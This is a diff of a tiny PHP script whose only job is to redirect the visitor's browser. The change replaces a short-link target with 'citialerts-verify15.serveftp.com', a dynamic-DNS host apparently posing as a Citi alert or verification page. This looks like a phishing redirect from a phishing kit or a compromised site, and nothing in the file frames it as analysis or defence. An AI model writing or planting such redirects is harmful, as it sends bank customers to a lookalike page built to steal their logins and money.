@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: http://jeb.li/o0pAs"); 
+header("Location: https://citialerts-verify15.serveftp.com/"); 
   
 exit; 
 ?> 
